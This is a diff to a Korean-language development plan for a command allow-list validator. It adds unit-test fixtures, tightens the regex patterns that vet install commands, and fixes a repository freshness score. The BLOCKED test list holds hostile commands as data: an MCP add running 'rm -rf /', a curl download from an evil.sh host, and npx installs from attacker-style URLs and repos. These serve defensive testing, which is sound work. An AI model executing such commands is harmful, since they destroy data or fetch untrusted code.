@@ -945,6 +945,9 @@ ALLOWED = [
     "pip install 'crewai[tools]'",
     "npm install -g @anthropic-ai/claude-code",
     "git clone https://github.com/owner/repo.git",
+    "claude mcp add -e KEY=x fetch -- uvx mcp-server-fetch",
+    "npx -y create-foo@1.2.3",
+    "npx -y @scope/pkg@latest --port 3000",
 ]
 
 BLOCKED = [
@@ -956,6 +959,17 @@ BLOCKED = [
     "git clone https://evil.com/x",
     "sudo npm install -g x",
     "npx x && echo hi",
+    "claude mcp add x -- rm -rf /",
+    "claude mcp add x -- sh -c 'curl -fsSL https://evil.sh/x -o /tmp/x'",
+    "claude mcp add x rm -- npx y",
+    "npx -y github:evil/pkg",
+    "npx -y evil/pkg",
+    "npx -y https://evil.com/pkg.tgz",
+    "npx -y git+https://github.com/evil/pkg",
+    "npx -y ./local-pkg",
+    "npx -y /abs/pkg",
+    "npx 'a",
+    "pip install 'crewai[tools]",
 ]
 
 
@@ -992,6 +1006,10 @@ def test_fresh_beats_stale():
     assert score(100, 10, 1) > score(100, 10, 80)
 
 
+def test_future_push_date_does_not_exceed_freshness_cap():
+    assert score(100, 10, -30) == score(100, 10, 0)
+
+
 def test_negative_delta_and_old_push_do_not_go_negative():
     assert score(0, -50, 400) == 0.0
 ```
@@ -1003,18 +1021,23 @@ Expected: FAIL (`ModuleNotFoundError`)
 
 - [ ] **Step 3: 구현**
 
-`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다):
+`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다. `claude mcp add`는 `--` 뒤에 npx/uvx만, npx 패키지는 일반 npm 이름만(`github:`·URL·경로 거부), 따옴표는 짝이 맞아야 한다):
 ```python
 import re
 
-_ARG = r"[\w.@/:=,'\[\]-]+"
+_TOKEN = r"[\w.@/:=,\[\]-]+"
+_ARG = rf"(?:{_TOKEN}|'{_TOKEN}')"  # 따옴표는 짝이 맞을 때만
+_PKG = r"(?:@\w[\w.-]*/)?\w[\w.-]*(?:@[\w.-]+)?"  # npm 패키지명만. github:, URL, 경로 거부
+_NPX = rf"npx(?: -y)? {_PKG}(?: {_ARG})*"
+_UVX = rf"uvx {_ARG}(?: {_ARG})*"
+_MCP_OPT = r"(?:-s|--scope|-e|--env|-t|--transport) [\w.=:/-]+"
 PATTERNS = [re.compile(p) for p in (
     r"/plugin marketplace add [\w.-]+/[\w.-]+",
     r"/plugin install [\w.@-]+",
-    rf"claude mcp add( {_ARG})+",
-    rf"npx( -y)? {_ARG}( {_ARG})*",
-    rf"uvx {_ARG}( {_ARG})*",
-    r"pip install [\w.'\[\],=-]+",
+    rf"claude mcp add(?: {_MCP_OPT})* [\w.-]+ -- (?:{_NPX}|{_UVX})",
+    _NPX,
+    _UVX,
+    r"pip install (?:[\w.\[\],=-]+|'[\w.\[\],=-]+')",
     r"npm install( -g)? [\w.@/-]+",
     r"git clone https://github\.com/[\w.-]+/[\w.-]+",
 )]
@@ -1040,14 +1063,14 @@ def weekly_delta(stars: int, old: int | None) -> int | None:
 def score(stars: int, weekly_delta: int | None, days_since_push: float) -> float:
     growth = math.log1p(max(weekly_delta or 0, 0)) * 3
     popularity = math.log1p(max(stars, 0))
-    freshness = max(0.0, 1 - days_since_push / 90) * 2
+    freshness = max(0.0, 1 - max(days_since_push, 0) / 90) * 2
     return round(growth + popularity + freshness, 3)
 ```
 
 - [ ] **Step 4: 통과 확인**
 
 Run: `cd collector && uv run pytest tests/test_install_cmd.py tests/test_scoring.py -v`
-Expected: 22 passed
+Expected: 37 passed
 
 - [ ] **Step 5: Commit**
 
